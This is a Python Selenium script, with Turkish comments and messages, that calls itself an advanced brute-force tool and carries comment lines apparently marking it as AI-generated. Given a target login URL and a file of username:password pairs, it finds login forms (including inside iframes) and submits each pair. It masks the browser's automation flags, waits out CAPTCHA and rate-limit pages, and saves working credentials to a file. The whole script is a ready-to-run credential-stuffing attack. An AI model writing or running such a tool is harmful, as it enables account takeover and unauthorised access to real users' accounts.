# --- AI SIGNATURE: ROBUST-ELEMENT-FINDER-SCRIPT ---
import argparse
import sys
import time
from tqdm import tqdm
from colorama import Fore, Style, init

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import NoSuchElementException, WebDriverException, TimeoutException
except ImportError:
    print(f"{Fore.RED}[!] Gerekli Selenium kütüphaneleri bulunamadı. Lütfen 'pip install selenium colorama tqdm' ile kurun.")
    sys.exit(1)

init(autoreset=True)

# --- Helper Print Functions ---
def print_info(message):
    print(f"{Style.BRIGHT}[+] {message}{Style.RESET_ALL}")

def print_debug(message):
    print(f"{Fore.CYAN}[DEBUG] {message}{Style.RESET_ALL}")

def print_warning(message):
    print(f"{Fore.YELLOW}[!] {message}{Style.RESET_ALL}")

def print_critical(message):
    print(f"{Fore.RED}[CRITICAL] {message}{Style.RESET_ALL}")

def print_success(message):
    print(f"{Fore.GREEN}[SUCCESS] {message}{Style.RESET_ALL}")
# --- End Helper Functions ---

def set_input_value_and_trigger_events(driver, element, value):
    driver.execute_script("""
        var input = arguments[0], value = arguments[1];
        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
        nativeInputValueSetter.call(input, value);
        input.dispatchEvent(new Event('input', { bubbles: true }));
        input.dispatchEvent(new Event('change', { bubbles: true }));
    """, element, value)

def find_login_elements(driver):
    """iframe'leri de kontrol ederek login formunu ve inputları akıllıca bulur."""
    print_debug("Login elementleri aranıyor...")
    wait = WebDriverWait(driver, 10)
    
    # Önce ana sayfada ara
    try:
        form = wait.until(EC.presence_of_element_located((By.TAG_NAME, 'form')))
        pass_input = form.find_element(By.CSS_SELECTOR, "input[type='password']")
        # Kullanıcı adı için daha esnek seçiciler
        user_input_selectors = [
            "input[type='text']", "input[type='email']",
            "input[name*='user']", "input[name*='login']", "input[name*='email']",
            "input[id*='user']", "input[id*='login']", "input[id*='email']"
        ]
        for selector in user_input_selectors:
            try:
                user_input = form.find_element(By.CSS_SELECTOR, selector)
                if user_input.is_displayed():
                    print_debug("Ana sayfada login elementleri bulundu.")
                    return form, user_input, pass_input
            except NoSuchElementException:
                continue
    except (TimeoutException, NoSuchElementException):
        print_debug("Ana sayfada form bulunamadı, iframe'ler kontrol ediliyor.")

    # iframe'lerde ara
    iframes = driver.find_elements(By.TAG_NAME, 'iframe')
    for frame in iframes:
        try:
            driver.switch_to.frame(frame)
            print_debug(f"iframe '{frame.get_attribute('id') or frame.get_attribute('name')}' içine girildi.")
            form = wait.until(EC.presence_of_element_located((By.TAG_NAME, 'form')))
            pass_input = form.find_element(By.CSS_SELECTOR, "input[type='password']")
            for selector in user_input_selectors:
                try:
                    user_input = form.find_element(By.CSS_SELECTOR, selector)
                    if user_input.is_displayed():
                        print_debug("iframe içinde login elementleri bulundu.")
                        return form, user_input, pass_input
                except NoSuchElementException:
                    continue
            driver.switch_to.default_content() # Ana sayfaya geri dön
        except (TimeoutException, NoSuchElementException):
            print_debug("Bu iframe'de form bulunamadı.")
            driver.switch_to.default_content()
            continue
            
    raise NoSuchElementException("Otomatik olarak login formu, kullanıcı adı veya şifre alanı bulunamadı.")


def initialize_driver(browser, headless):
    print_debug(f"Tarayıcı '{browser}' için ayarlar yapılıyor.")
    if browser == 'chrome':
        from selenium.webdriver.chrome.options import Options as ChromeOptions
        options = ChromeOptions()
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
    else: # firefox
        from selenium.webdriver.firefox.options import Options as FirefoxOptions
        options = FirefoxOptions()

    if headless: options.add_argument('--headless')
    options.add_argument('--no-sandbox'); options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu'); options.add_argument('--window-size=1280x800')
    
    if browser == 'chrome': driver = webdriver.Chrome(options=options)
    else: driver = webdriver.Firefox(options=options)
    driver.implicitly_wait(5) # Elementlerin yüklenmesi için genel bir bekleme süresi
    return driver

def get_args():
    parser = argparse.ArgumentParser(description="Gelişmiş Selenium Brute-Force Aracı", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-u', '--url', required=True, help="Hedef URL (örn: http://site.com/login)")
    parser.add_argument('-c', '--combo', required=True, help="Kullanıcı:şifre kombinasyonlarını içeren dosya")
    parser.add_argument('--browser', choices=['chrome', 'firefox'], default='firefox', help="Kullanılacak tarayıcı (chrome/firefox)")
    parser.add_argument('--headless', action='store_true', help="Tarayıcıyı arayüz olmadan (headless) çalıştır")
    parser.add_argument('--rate-limit-wait', type=int, default=300, help="Rate limit tespit edildiğinde beklenecek süre (saniye)")
    parser.add_argument('--rate-limit-tries', type=int, default=15, help="Kaç denemede bir rate limit kontrolü yapılsın")
    return parser.parse_args()

def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        print_warning("URL 'http://' veya 'https://' ile başlamalı. Otomatik olarak 'https://' ekleniyor.")
        return 'https://' + url
    return url

def read_combos(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip().split(':', 1) for line in f if ':' in line and len(line.strip().split(':', 1)) == 2]
        if not combos:
            print_critical("Combo listesi boş veya geçersiz formatta (her satır 'kullanıcı:şifre' olmalı).")
            sys.exit(1)
        print_success(f"{len(combos)} adet kombinasyon yüklendi.")
        return combos
    except FileNotFoundError:
        print_critical(f"Combo dosyası bulunamadı: {file_path}")
        sys.exit(1)

def main():
    args = get_args()
    url = validate_url(args.url.strip())
    combos = read_combos(args.combo)
    
    driver = None
    pbar = None
    success_log = open("basarili_giris.txt", "a")
    
    try:
        driver = initialize_driver(args.browser, args.headless)
        print_info(f"'{url}' adresine gidiliyor...")
        try:
            driver.get(url)
            # Sayfa yüklendikten sonra 3 saniye bekle, dinamik içeriklerin yerleşmesi için
            time.sleep(3) 
        except WebDriverException as e:
            print_critical(f"URL'e ulaşılamadı. Lütfen URL'yi ve internet bağlantınızı kontrol edin. Hata: {e.msg}")
            return # finally bloğu çalışacak

        initial_url = driver.current_url

        print_info("Giriş formu ve elemanları aranıyor...")
        form, user_input, pass_input = find_login_elements(driver)
        
        # Uzunluk Kurallarını Al ve Filtrele
        user_min = user_input.get_attribute('minlength') or 0
        user_max = user_input.get_attribute('maxlength') or 999
        pass_min = pass_input.get_attribute('minlength') or 0
        pass_max = pass_input.get_attribute('maxlength') or 999
        
        original_combo_count = len(combos)
        combos = [
            (u, p) for u, p in combos 
            if int(user_min) <= len(u) <= int(user_max) and int(pass_min) <= len(p) <= int(pass_max)
        ]
        
        if len(combos) < original_combo_count:
            print_warning(f"Form uzunluk kurallarına uymayan {original_combo_count - len(combos)} kombinasyon elendi.")
        
        if not combos:
            print_critical("Filtreleme sonrası denenecek kombinasyon kalmadı.")
            return
            
        print_info(f"{len(combos)} kombinasyon denenecek...")
        pbar = tqdm(total=len(combos), desc="Denemeler", unit=" combo", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}{postfix}]")

        for i, (username, password) in enumerate(combos):
            current_url_before_submit = driver.current_url
            try:
                # Her denemeden önce elementlerin "taze" olduğundan emin ol
                if i > 0:
                    form, user_input, pass_input = find_login_elements(driver)

                set_input_value_and_trigger_events(driver, user_input, username)
                set_input_value_and_trigger_events(driver, pass_input, password)
                
                form.submit()
                
                # Başarı kontrolü: URL'in değişmesini bekleyeceğiz.
                # Bazen submit sonrası sayfa hemen değişmez, bu yüzden kısa bir bekleme ekliyoruz.
                WebDriverWait(driver, 3).until(EC.url_changes(current_url_before_submit))
                
                print_success(f"\nBaşarılı Giriş! Kullanıcı: {username} | Şifre: {password}")
                success_log.write(f"{username}:{password}\n")
                
                # Başarılı olunca döngüyü kır
                break

            except TimeoutException:
                # Giriş başarısız oldu (URL değişmedi), devam et
                pbar.update(1)
                pbar.set_postfix_str(f"Denendi: {username}:{password} -> Başarısız")
                
                # Rate-limit kontrolü
                if (i + 1) % args.rate_limit_tries == 0:
                    page_source = driver.page_source.lower()
                    if "captcha" in page_source or "too many requests" in page_source or "rate limit" in page_source:
                        print_warning(f"\nOlası rate-limit/CAPTCHA tespit edildi. {args.rate_limit_wait} saniye bekleniyor...")
                        time.sleep(args.rate_limit_wait)
                        driver.refresh() # Sayfayı yenileyerek CAPTCHA'dan kurtulmayı dene
            
            except (NoSuchElementException, WebDriverException) as e:
                print_warning(f"\nForm elemanı bulunamadı veya sayfa değişti. Sayfa yenileniyor... Hata: {e}")
                driver.get(url) # Sayfayı yeniden yükle
                continue # Bu kombinasyonu atla ve sonraki ile devam et

    except (WebDriverException, NoSuchElementException, TimeoutException) as e:
        print_critical(f"Ana programda bir sorun oluştu: {e}")
    except KeyboardInterrupt:
        print_warning("\nKullanıcı tarafından işlem iptal edildi.")
    finally:
        if pbar:
            pbar.close()
        if driver:
            print_info("Tarayıcı kapatılıyor.")
            driver.quit()
        if success_log:
            success_log.close()
        print_info("Tarama tamamlandı.")

if __name__ == "__main__":
    main()

# --- AI SIGNATURE: ROBUST-ELEMENT-FINDER-SCRIPT-BITIS --- 